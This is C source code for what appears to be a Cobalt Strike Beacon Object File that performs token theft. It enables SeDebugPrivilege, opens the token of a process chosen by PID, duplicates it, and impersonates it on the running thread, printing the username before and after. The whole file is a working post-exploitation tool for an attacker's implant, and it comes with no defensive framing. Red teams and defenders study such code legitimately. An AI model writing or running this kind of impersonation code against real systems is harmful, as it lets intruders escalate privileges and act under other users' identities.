
#include <windows.h>
#include <stdio.h>
#include "beacon.h"


DECLSPEC_IMPORT WINADVAPI BOOL WINAPI LookupPrivilegeValueW(
    LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid
);

DECLSPEC_IMPORT WINADVAPI BOOL WINAPI AdjustTokenPrivileges(
    HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD
);

DECLSPEC_IMPORT WINADVAPI BOOL WINAPI PrivilegeCheck(
    HANDLE, PPRIVILEGE_SET, LPBOOL
);

DECLSPEC_IMPORT WINADVAPI BOOL WINAPI OpenProcessToken(
    HANDLE, DWORD, PHANDLE
);

DECLSPEC_IMPORT WINADVAPI BOOL WINAPI DuplicateTokenEx(
    HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE
);

DECLSPEC_IMPORT WINADVAPI BOOL WINAPI SetThreadToken(
    PHANDLE, HANDLE
);

DECLSPEC_IMPORT BOOL WINAPI GetUserNameA(
    LPSTR lpBuffer, LPDWORD pcbBuffer
);

void go(char * args, int alen) {
    datap parser;
    DWORD pid = 0;
    BeaconDataParse(&parser, args, alen);
    pid = BeaconDataInt(&parser);

    HANDLE hProc = NULL, hToken = NULL, hNewToken = NULL;
    LUID luid;
    char username[256] = {0};
    DWORD username_len = sizeof(username);

    // Get SeDebugPrivilege
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue failed: %u", GetLastError());
        return;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %u", GetLastError());
        return;
    }

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges failed: %u", GetLastError());
        return;
    }

    PRIVILEGE_SET privSet = {0};
    privSet.PrivilegeCount = 1;
    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privSet.Privilege[0].Luid = luid;
    privSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL privEnabled = 0;
    if (!PrivilegeCheck(hToken, &privSet, &privEnabled)) {
        BeaconPrintf(CALLBACK_ERROR, "PrivilegeCheck failed: %u", GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SeDebugPrivilege is: %s", privEnabled ? "ENABLED" : "DISABLED");

    username_len = sizeof(username);
    if (!GetUserNameA(username, &username_len)) {
        BeaconPrintf(CALLBACK_ERROR, "GetUserNameA failed: %u", GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Current Username: %s", username);

    // Open target process
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed: %u", GetLastError());
        return;
    }

    if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken(target) failed: %u", GetLastError());
        CloseHandle(hProc);
        return;
    }

    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %u", GetLastError());
        CloseHandle(hProc);
        CloseHandle(hToken);
        return;
    }

    if (!SetThreadToken(NULL, hNewToken)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadToken failed: %u", GetLastError());
        CloseHandle(hProc);
        CloseHandle(hToken);
        CloseHandle(hNewToken);
        return;
    }

    username_len = sizeof(username);
    if (!GetUserNameA(username, &username_len)) {
        BeaconPrintf(CALLBACK_ERROR, "GetUserNameA(after) failed: %u", GetLastError());
        // Still continue to cleanup
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Username after impersonation: %s", username);

    // Cleanup
    if (hProc) CloseHandle(hProc);
    if (hToken) CloseHandle(hToken);
    if (hNewToken) CloseHandle(hNewToken);
}
